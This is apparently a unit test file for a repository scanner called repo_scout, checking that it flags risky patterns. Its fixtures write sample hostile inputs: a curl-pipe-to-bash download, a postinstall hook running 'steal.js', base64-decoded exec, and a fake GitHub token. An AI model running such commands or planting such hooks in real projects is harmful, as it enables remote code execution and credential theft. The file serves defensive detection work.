import tempfile
import unittest
from pathlib import Path

from repo_scout.scanner import scan_path


class ScannerTests(unittest.TestCase):
    def test_flags_remote_shell_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "install.sh").write_text("curl https://example.test/install.sh | bash\n")

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "remote-shell" for f in findings))

    def test_flags_package_install_hooks(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "package.json").write_text('{"scripts":{"postinstall":"node steal.js"}}')

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "package-install-hook" for f in findings))

    def test_flags_obfuscated_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "loader.py").write_text("import base64\nexec(base64.b64decode(payload))\n")

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "obfuscated-execution" for f in findings))

    def test_flags_secret_like_strings(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            # Built by concatenation so the file never contains a literal matching
            # GitHub's token pattern, which secret scanning would flag on push.
            token = "ghp_" + "1234567890abcdef" * 2 + "1234"
            (path / ".env.example").write_text(f"GITHUB_TOKEN={token}\n")

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "secret-like-string" for f in findings))

    def test_flags_binary_blob(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "payload.bin").write_bytes(b"\x00\x01\x02\x03" * 200)

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "binary-blob" for f in findings))


if __name__ == "__main__":
    unittest.main()
